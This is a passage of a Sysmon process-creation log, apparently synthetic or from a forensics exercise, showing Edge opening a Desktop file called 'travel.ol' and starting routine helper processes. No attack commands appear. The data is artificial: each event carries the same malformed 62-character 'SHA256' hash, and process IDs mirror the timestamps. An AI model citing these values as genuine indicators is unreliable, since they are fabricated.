      <Data Name="UtcTime">2025-08-01 14:00:06.764</Data>
      <Data Name="ProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000017}</Data>
      <Data Name="ProcessId">5764</Data>
      <Data Name="Image">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="FileVersion">133.0.3065.92</Data>
      <Data Name="CommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" "travel.ol"</Data>
      <Data Name="CurrentDirectory">C:\Users\john\Desktop</Data>
      <Data Name="User">DESKTOP-R8Y9C01\john</Data>
      <Data Name="LogonGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000006}</Data>
      <Data Name="LogonId">0x13c7d6</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA256=1c8d5c4149021e1a53383a8b489a2441c8d5c4149021e1a53383a8b489a244</Data>
      <Data Name="ParentProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c0000000b}</Data>
      <Data Name="ParentProcessId">884</Data>
      <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
      <Data Name="ParentCommandLine">C:\Windows\explorer.exe</Data>
      <Data Name="ParentUser">DESKTOP-R8Y9C01\john</Data>
    </EventData>
  </Event>
  <Event>
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e3-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2025-08-01T14:00:06.900900000Z" />
      <EventRecordID>15</EventRecordID>
      <Correlation />
      <Execution ProcessID="5900" ThreadID="456" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>DESKTOP-R8Y9C01</Computer>
      <Security UserID="S-1-5-21-4321098765-1234567890-987654321-1001" />
    </System>
    <EventData>
      <Data Name="RuleName">Process Create</Data>
      <Data Name="UtcTime">2025-08-01 14:00:06.900</Data>
      <Data Name="ProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000018}</Data>
      <Data Name="ProcessId">5900</Data>
      <Data Name="Image">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="FileVersion">133.0.3065.92</Data>
      <Data Name="CommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=unzip.mojom.Unzipper --lang=en-US --service-sandbox-type=service --disable-quic --string-annotations --always-read-main-dll --field-trial-handle=6936,i,1550120243657407965,15967058427792045687,262144 --variations-seed-version --mojo-platform-channel-handle=6000 /prefetch:8</Data>
      <Data Name="CurrentDirectory">C:\Users\john\Desktop</Data>
      <Data Name="User">DESKTOP-R8Y9C01\john</Data>
      <Data Name="LogonGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000006}</Data>
      <Data Name="LogonId">0x13c7d6</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA256=1c8d5c4149021e1a53383a8b489a2441c8d5c4149021e1a53383a8b489a244</Data>
      <Data Name="ParentProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000007}</Data>
      <Data Name="ParentProcessId">876</Data>
      <Data Name="ParentImage">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="ParentCommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"</Data>
      <Data Name="ParentUser">DESKTOP-R8Y9C01\john</Data>
    </EventData>
  </Event>
  <Event>
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e3-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2025-08-01T14:00:06.980900000Z" />
      <EventRecordID>16</EventRecordID>
      <Correlation />
      <Execution ProcessID="5980" ThreadID="456" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>DESKTOP-R8Y9C01</Computer>
      <Security UserID="S-1-5-21-4321098765-1234567890-987654321-1001" />
    </System>
    <EventData>
      <Data Name="RuleName">Process Create</Data>
      <Data Name="UtcTime">2025-08-01 14:00:06.980</Data>
      <Data Name="ProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000019}</Data>
      <Data Name="ProcessId">5980</Data>
      <Data Name="Image">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="FileVersion">133.0.3065.92</Data>
      <Data Name="CommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=edge_search_indexer.mojom.SearchIndexerInterfaceBroker --lang=en-US --service-sandbox-type=search_indexer --disable-quic --message-loop-type-ui --string-annotations --always-read-main-dll --field-trial-handle=6752,i,1550120243657407965,15967058427792045687,262144 --variations-seed-version --mojo-platform-channel-handle=4976 /prefetch:8</Data>
      <Data Name="CurrentDirectory">C:\Users\john\Desktop</Data>
      <Data Name="User">DESKTOP-R8Y9C01\john</Data>
      <Data Name="LogonGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000006}</Data>
      <Data Name="LogonId">0x13c7d6</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA256=1c8d5c4149021e1a53383a8b489a2441c8d5c4149021e1a53383a8b489a244</Data>
      <Data Name="ParentProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000007}</Data>
      <Data Name="ParentProcessId">876</Data>
      <Data Name="ParentImage">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="ParentCommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"</Data>
      <Data Name="ParentUser">DESKTOP-R8Y9C01\john</Data>
    </EventData>
  </Event>
  <Event>
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e3-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2025-08-01T14:00:07.200900000Z" />
      <EventRecordID>17</EventRecordID>
      <Correlation />
      <Execution ProcessID="6200" ThreadID="456" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>DESKTOP-R8Y9C01</Computer>
      <Security UserID="S-1-5-21-4321098765-1234567890-987654321-1001" />
    </System>
    <EventData>
      <Data Name="RuleName">Process Create</Data>
      <Data Name="UtcTime">2025-08-01 14:00:07.200</Data>
      <Data Name="ProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c0000001a}</Data>
      <Data Name="ProcessId">6200</Data>
      <Data Name="Image">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="FileVersion">133.0.3065.92</Data>
      <Data Name="CommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=crashpad-handler "--user-data-dir=C:\Users\john\AppData\Local\Microsoft\Edge\User Data" /prefetch:4 --monitor-self-annotation=ptype=crashpad-handler "--database=C:\Users\john\AppData\Local\Microsoft\Edge\User Data\Crashpad" --annotation=IsOfficialBuild=1 --annotation=channel= --annotation=chromium-version=133.0.6943.142 "--annotation=exe=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --annotation=plat=Win64 --annotation=prod=Edge --annotation=ver=133.0.3065.92 --initial-client-data=0x304,0x308,0x30c,0x2fc,0x314,0x7ffc43b0f208,0x7ffc43b0f214,0x7ffc43b0f220</Data>
      <Data Name="CurrentDirectory">C:\Users\john\Desktop</Data>
      <Data Name="User">DESKTOP-R8Y9C01\john</Data>
      <Data Name="LogonGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000006}</Data>
      <Data Name="LogonId">0x13c7d6</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA256=1c8d5c4149021e1a53383a8b489a2441c8d5c4149021e1a53383a8b489a244</Data>
      <Data Name="ParentProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000007}</Data>
      <Data Name="ParentProcessId">876</Data>
      <Data Name="ParentImage">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="ParentCommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"</Data>
      <Data Name="ParentUser">DESKTOP-R8Y9C01\john</Data>
    </EventData>
  </Event>
  <Event>
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e3-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2025-08-01T14:00:07.372900000Z" />
      <EventRecordID>18</EventRecordID>
      <Correlation />
      <Execution ProcessID="6372" ThreadID="456" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>DESKTOP-R8Y9C01</Computer>
      <Security UserID="S-1-5-21-4321098765-1234567890-987654321-1001" />
    </System>
    <EventData>
      <Data Name="RuleName">Process Create</Data>
      <Data Name="UtcTime">2025-08-01 14:00:07.372</Data>
      <Data Name="ProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c0000001b}</Data>
      <Data Name="ProcessId">6372</Data>
      <Data Name="Image">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="FileVersion">133.0.3065.92</Data>
      <Data Name="CommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=unzip.mojom.Unzipper --lang=en-US --service-sandbox-type=service --disable-quic --string-annotations --always-read-main-dll --field-trial-handle=5752,i,1550120243657407965,15967058427792045687,262144 --variations-seed-version --mojo-platform-channel-handle=6324 /prefetch:8</Data>
      <Data Name="CurrentDirectory">C:\Users\john\Desktop</Data>
      <Data Name="User">DESKTOP-R8Y9C01\john</Data>
      <Data Name="LogonGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000006}</Data>
      <Data Name="LogonId">0x13c7d6</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA256=1c8d5c4149021e1a53383a8b489a2441c8d5c4149021e1a53383a8b489a244</Data>
      <Data Name="ParentProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000007}</Data>
      <Data Name="ParentProcessId">876</Data>
      <Data Name="ParentImage">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="ParentCommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"</Data>
      <Data Name="ParentUser">DESKTOP-R8Y9C01\john</Data>
    </EventData>
  </Event>
  <Event>
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e3-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2025-08-01T14:00:07.392900000Z" />
      <EventRecordID>19</EventRecordID>
      <Correlation />
      <Execution ProcessID="6392" ThreadID="456" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>DESKTOP-R8Y9C01</Computer>
      <Security UserID="S-1-5-21-4321098765-1234567890-987654321-1001" />
    </System>
    <EventData>
      <Data Name="RuleName">Process Create</Data>
      <Data Name="UtcTime">2025-08-01 14:00:07.392</Data>
      <Data Name="ProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c0000001c}</Data>
      <Data Name="ProcessId">6392</Data>
      <Data Name="Image">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="FileVersion">133.0.3065.92</Data>
      <Data Name="CommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=gpu-process --string-annotations --gpu-preferences=UAAAAAAAAADgAAAEAAAAAAAAAAAAAAAAAABgAAEAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA --always-read-main-dll --field-trial-handle=2384,i,1550120243657407965,15967058427792045687,262144 --variations-seed-version --mojo-platform-channel-handle=2380 /prefetch:2</Data>
      <Data Name="CurrentDirectory">C:\Users\john\Desktop</Data>
      <Data Name="User">DESKTOP-R8Y9C01\john</Data>
      <Data Name="LogonGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000006}</Data>
      <Data Name="LogonId">0x13c7d6</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA256=1c8d5c4149021e1a53383a8b489a2441c8d5c4149021e1a53383a8b489a244</Data>
      <Data Name="ParentProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000007}</Data>
      <Data Name="ParentProcessId">876</Data>
      <Data Name="ParentImage">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="ParentCommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"</Data>
      <Data Name="ParentUser">DESKTOP-R8Y9C01\john</Data>
    </EventData>
  </Event>
  <Event>
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e3-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2025-08-01T14:00:07.648900000Z" />
      <EventRecordID>20</EventRecordID>
      <Correlation />
      <Execution ProcessID="6648" ThreadID="456" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>DESKTOP-R8Y9C01</Computer>
      <Security UserID="S-1-5-21-4321098765-1234567890-987654321-1001" />
    </System>
    <EventData>
      <Data Name="RuleName">Process Create</Data>
      <Data Name="UtcTime">2025-08-01 14:00:07.648</Data>
      <Data Name="ProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c0000001d}</Data>
      <Data Name="ProcessId">6648</Data>
      <Data Name="Image">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="FileVersion">133.0.3065.92</Data>
      <Data Name="CommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=storage.mojom.StorageService --lang=en-US --service-sandbox-type=service --disable-quic --string-annotations --always-read-main-dll --field-trial-handle=2788,i,1550120243657407965,15967058427792045687,262144 --variations-seed-version --mojo-platform-channel-handle=2820 /prefetch:8</Data>
      <Data Name="CurrentDirectory">C:\Users\john\Desktop</Data>
      <Data Name="User">DESKTOP-R8Y9C01\john</Data>
      <Data Name="LogonGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000006}</Data>
      <Data Name="LogonId">0x13c7d6</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA256=1c8d5c4149021e1a53383a8b489a2441c8d5c4149021e1a53383a8b489a244</Data>
      <Data Name="ParentProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000007}</Data>
      <Data Name="ParentProcessId">876</Data>
      <Data Name="ParentImage">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="ParentCommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"</Data>
      <Data Name="ParentUser">DESKTOP-R8Y9C01\john</Data>
    </EventData>
  </Event>
  <Event>
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e3-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2025-08-01T14:00:07.664900000Z" />
      <EventRecordID>21</EventRecordID>
      <Correlation />
      <Execution ProcessID="6664" ThreadID="456" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>DESKTOP-R8Y9C01</Computer>
      <Security UserID="S-1-5-21-4321098765-1234567890-987654321-1001" />
    </System>
    <EventData>
      <Data Name="RuleName">Process Create</Data>
      <Data Name="UtcTime">2025-08-01 14:00:07.664</Data>
      <Data Name="ProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c0000001e}</Data>
      <Data Name="ProcessId">6664</Data>
      <Data Name="Image">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="FileVersion">133.0.3065.92</Data>
      <Data Name="CommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=unzip.mojom.Unzipper --lang=en-US --service-sandbox-type=service --disable-quic --string-annotations --always-read-main-dll --field-trial-handle=1860,i,1550120243657407965,15967058427792045687,262144 --variations-seed-version --mojo-platform-channel-handle=6936 /prefetch:8</Data>
      <Data Name="CurrentDirectory">C:\Users\john\Desktop</Data>
      <Data Name="User">DESKTOP-R8Y9C01\john</Data>
      <Data Name="LogonGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000006}</Data>
      <Data Name="LogonId">0x13c7d6</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA256=1c8d5c4149021e1a53383a8b489a2441c8d5c4149021e1a53383a8b489a244</Data>
      <Data Name="ParentProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000007}</Data>
      <Data Name="ParentProcessId">876</Data>
      <Data Name="ParentImage">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="ParentCommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"</Data>
      <Data Name="ParentUser">DESKTOP-R8Y9C01\john</Data>
    </EventData>
  </Event>
  <Event>
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e3-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2025-08-01T14:00:08.300900000Z" />
      <EventRecordID>22</EventRecordID>
      <Correlation />
      <Execution ProcessID="7300" ThreadID="456" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>DESKTOP-R8Y9C01</Computer>
      <Security UserID="S-1-5-21-4321098765-1234567890-987654321-1001" />
    </System>
    <EventData>
      <Data Name="RuleName">Process Create</Data>
      <Data Name="UtcTime">2025-08-01 14:00:08.300</Data>
      <Data Name="ProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c0000001f}</Data>
      <Data Name="ProcessId">7300</Data>
      <Data Name="Image">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="FileVersion">133.0.3065.92</Data>
      <Data Name="CommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=renderer --string-annotations --video-capture-use-gpu-memory-buffer --lang=en-US --js-flags=--ms-user-locale= --device-scale-factor=1 --num-raster-threads=2 --enable-main-frame-before-activation --renderer-client-id=6 --always-read-main-dll --field-trial-handle=3660,i,1550120243657407965,15967058427792045687,262144 --variations-seed-version --mojo-platform-channel-handle=3680 /prefetch:1</Data>
      <Data Name="CurrentDirectory">C:\Users\john\Desktop</Data>
      <Data Name="User">DESKTOP-R8Y9C01\john</Data>
      <Data Name="LogonGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000006}</Data>
      <Data Name="LogonId">0x13c7d6</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA256=1c8d5c4149021e1a53383a8b489a2441c8d5c4149021e1a53383a8b489a244</Data>
      <Data Name="ParentProcessGuid">{88c0a87a-b44c-64c8-3c3e-e67c00000007}</Data>
      <Data Name="ParentProcessId">876</Data>
      <Data Name="ParentImage">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name="ParentCommandLine">"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"</Data>
      <Data Name="ParentUser">DESKTOP-R8Y9C01\john</Data>
    </EventData>
  </Event>
  